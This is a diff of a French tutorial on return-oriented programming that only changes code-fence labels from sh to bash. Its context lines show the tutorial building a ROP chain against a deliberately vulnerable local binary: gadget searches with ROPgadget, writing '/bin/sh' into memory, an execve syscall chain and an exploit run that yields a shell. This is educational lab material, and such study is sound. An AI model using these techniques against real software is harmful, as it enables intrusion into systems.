@@ -53,7 +53,7 @@ Il est vrai qu'un binaire possède rarement le code permettant de lancer un shel
 
 Un exemple pas vraiment réaliste mais qui permet d'illustrer mes propos. Considérons la suite d'instruction présente, qui se trouve dans le binaire :
 
-```sh
+```bash
 [1] PUSH    EBP
 [2] MOV     EBP, ESP
 [3] SUB     ESP, 0x40
@@ -66,7 +66,7 @@ Un exemple pas vraiment réaliste mais qui permet d'illustrer mes propos. Consid
 
 Le code précédant est un prologue de fonction, et place la chaine de caractère `ABCD\x00` sur la pile avant d'appeler la fonction `printf`. Remarquez que j'ai numéroté les lignes. Si maintenant nous prenons les instructions dans un nouvel ordre, par exemple [4] puis [5] suivi de [1] et enfin [8] alors nous aurions
 
-```sh
+```bash
 [4] XOR     EAX, EAX
 [5] PUSH    EAX
 [1] PUSH    EBP
@@ -77,7 +77,7 @@ Dans ce cas, nous aurions `0x00` sur la pile suivi de la valeur de `EBP` et enfi
 
 Mais ce n'est pas tout, nous pouvons aller encore plus loin. Voilà la représentation en hexadécimal des instructions précédentes
 
-```sh
+```bash
 55                  PUSH    EBP
 89 e5               MOV     EBP, ESP
 81 ec 40 00 00 00   SUB     ESP, 0x40
@@ -120,7 +120,7 @@ Ainsi, lorsque les instructions que nous voulons effectuer ont été exécutées
 
 Voici un exemple concret. Imaginons que dans l'ensemble des instructions de mon binaire, je trouve à différents endroits les instructions suivantes
 
-```sh
+```bash
 # 0x08041234 Instructions 1
 INC   EAX
 RET
@@ -145,7 +145,7 @@ D'après le tableau 32 bits, pour faire un appel système à `sys_exit`, `EAX` d
 
 Afin d'obtenir ces valeurs, en ayant les 4 différentes suites d'instructions précédentes, nous pouvons faire ceci :
 
-```sh
+```bash
 XOR    EAX, EAX		# Pour que EAX = 0
 INC    EAX		# Afin que EAX = 1
 POP    EBX		# En faisant en sorte que la valeur 0x00000003 soit sur la pile
@@ -162,7 +162,7 @@ Nous allons donc rediriger le flux d'exécution vers la première instruction qu
 
 Le flux d'exécution va être redirigé vers les instructions
 
-```sh
+```bash
 # 0x08041234 Instructions 1
 XOR    EAX, EAX
 RET
@@ -222,7 +222,7 @@ J'utilise ici le compilateur `clang` car `gcc` [produit un prologue et un épilo
 
 Vous remarquez l'évident buffer overflow, si nous passons à ce binaire un gros buffer, il va normalement nous renvoyer une erreur de segmentation.
 
-```sh
+```bash
 $ perl -e 'print "A"x500' | ./rop
 You password is incorrect
 Segmentation fault (core dumped)
@@ -230,7 +230,7 @@ Segmentation fault (core dumped)
 
 Comme le montre la commande suivante, la stack `GNU_STACK` n'a pas le flag `X` (seulement `RW`) donc elle n'est donc pas exécutable.
 
-```sh
+```bash
 $ readelf -l rop
 
 Elf file type is EXEC (Executable file)
@@ -250,14 +250,14 @@ Program Headers:
 
 Par ailleurs, l'ASLR est activé comme le montre le flag situé ici
 
-```sh
+```bash
 $ cat /proc/sys/kernel/randomize_va_space
 2
 ```
 
 Si vous n'avez pas le même résultat, avec un autre nombre que le `2`, alors effectuez cette commande pour activer l'ASLR.
 
-```sh
+```bash
 echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
 ```
 
@@ -267,7 +267,7 @@ Nous allons essayer de lancer un shell avec ce programme, malgré les protection
 
 Une commande de base est 
 
-```sh
+```bash
 $ ROPgadget --binary rop
 
 ```
@@ -276,7 +276,7 @@ Cette commande va nous sortir tous les gadgets qui finissent par un RET avec 10 
 
 En voici un extrait
 
-```sh
+```bash
 [...]
 0x0804c47e : xor eax, eax ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
 0x08050815 : xor eax, eax ; pop ebx ; pop esi ; pop edi ; ret
@@ -290,7 +290,7 @@ Vous voyez qu'on a de quoi faire. 11840 résultats.
 
 Si par exemple nous voulons trouver un `XOR EAX, EAX`
 
-```sh
+```bash
 $ ROPgadget --binary rop | grep "xor eax"
 [...]
 0x08049323 : xor eax, eax ; ret
@@ -302,7 +302,7 @@ Je vous rappelle que nous voulons exécuter un shell. Il nous faut alors lancer 
 
 D'après la table des appels systèmes [32 bits](https://github.com/Hackndo/misc/blob/master/syscalls32.md){:target="blank"}, la valeur de `EAX` pour un `execve` est de 11. Maintenant qu'on a un gadget qui initialise `EAX` à zéro, il faut par exemple l'incrémenter.
 
-```sh
+```bash
 $ ROPgadget --binary rop | grep "inc eax"
 [...]
 0x0804812c : inc eax ; ret
@@ -317,7 +317,7 @@ Pour pointer sur la chaine de caractère "/bin/sh", il faut la placer en mémoir
 
 En voici un exemple avec les gadgets proposés par le binaire
 
-```sh
+```bash
 0x0806ed1a : pop edx ; ret
 0x080b8056 : pop eax ; ret
 0x080546db : mov dword ptr [edx], eax ; ret
@@ -327,7 +327,7 @@ Avec ces trois gadgets, nous contrôlons les contenus des registres `EDX` et `EA
 
 Nous sommes donc en mesure d'écrire "/bin/sh" quelque part en mémoire, par exemple dans .data qui ne bouge pas malgré l'ASLR.
 
-```sh
+```bash
 $ readelf -S rop | grep " .data "
   [23] .data             PROGBITS        080ea000 0a1000 000f20 00  WA  0   0 32
 ```
@@ -336,14 +336,14 @@ $ readelf -S rop | grep " .data "
 
 Enfin, nous devons trouver des gadgets pour contrôler nos registres `EBX` et `ECX` (car nous avons déjà trouvé un gadget pour `EDX` lors du _write-what-where_). Vous avez compris la technique, en voici deux :
 
-```sh
+```bash
 0x080de7ad : pop ecx ; ret
 0x080481c9 : pop ebx ; ret
 ```
 
 Bien sûr, pour pouvoir exécuter tout ça, il faut faire un appel à une instruction `int 0x80`
 
-```sh
+```bash
 0x0806c985 : int 0x80
 ```
 
@@ -460,7 +460,7 @@ r.interactive()
 
 Ainsi, lorsque nous lançons notre exploit, nous récupérons bien un shell
 
-```sh
+```bash
 $ python exploit.py 
 [+] Starting local process './rop': Done
 [*] Switching to interactive mode
@@ -470,7 +470,7 @@ $
 
 ROP, c'est super chouette, amusez vous avec ça. Dans mon exemple, je n'avais malheureusement pas de gadget de la form
 
-```sh
+```bash
 int 0x80
 ret
 ```
